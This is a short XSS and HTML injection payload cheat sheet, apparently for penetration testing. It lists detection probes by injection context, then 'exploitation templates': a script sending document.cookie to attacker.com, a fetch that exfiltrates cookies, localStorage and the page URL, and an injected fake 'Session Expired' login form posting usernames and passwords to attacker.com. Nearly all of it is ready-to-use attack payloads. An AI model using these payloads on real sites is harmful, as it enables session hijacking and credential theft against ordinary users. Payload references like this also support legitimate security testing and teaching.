# XSS & HTML Injection: Payload Reference

This document provides a quick-reference for common XSS and HTML injection payloads categorized by injection context and exploitation goal.

## XSS Detection Checklist
1. Insert `<script>alert(1)</script>` → Check execution
2. Insert `<img src=x onerror=alert(1)>` → Check event handler
3. Insert `"><script>alert(1)</script>` → Test attribute escape
4. Insert `javascript:alert(1)` → Test href/src attributes
5. Check URL hash handling → DOM XSS potential

## Common XSS Payloads by Context

| Context | Payload |
|---------|---------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `"><script>alert(1)</script>` |
| JavaScript string | `';alert(1)//` |
| JavaScript template | `${alert(1)}` |
| URL attribute | `javascript:alert(1)` |
| CSS context | `</style><script>alert(1)</script>` |
| SVG context | `<svg onload=alert(1)>` |

## Advanced Exploitation Templates

### Cookie Theft Payload
Exfiltrate session cookies to an external listener:
```javascript
<script>
new Image().src='http://attacker.com/c='+btoa(document.cookie);
</script>
```

### Session Hijacking Template
Capture comprehensive session state (cookies, localStorage, environment):
```javascript
<script>
fetch('https://attacker.com/log',{
  method:'POST',
  mode:'no-cors',
  body:JSON.stringify({
    cookies:document.cookie,
    localStorage:JSON.stringify(localStorage),
    url:location.href
  })
});
</script>
```

### Phishing Form Injection
Inject a fake login form to capture credentials:
```html
<div id="login">
<h2>Session Expired - Please Login</h2>
<form action="http://attacker.com/phish" method="POST">
Username: <input name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</div>
```
